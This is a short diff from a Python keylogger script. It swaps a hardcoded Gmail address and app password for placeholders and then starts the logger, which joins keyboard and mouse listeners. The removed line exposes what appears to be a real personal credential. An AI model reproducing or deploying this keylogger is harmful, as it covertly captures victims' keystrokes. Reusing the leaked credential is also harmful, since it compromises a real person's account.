@@ -189,5 +189,5 @@ class KeyLogger:
             keyboard_listener.join()
             mouse_listener.join()
 
-keylogger = KeyLogger("zuranaftab14@gmail.com", "rfqfkgjqqrdsdbiu", "keylog.txt", 10)
+keylogger = KeyLogger("email", "app password", "keylog.txt", 10)
 keylogger.start()
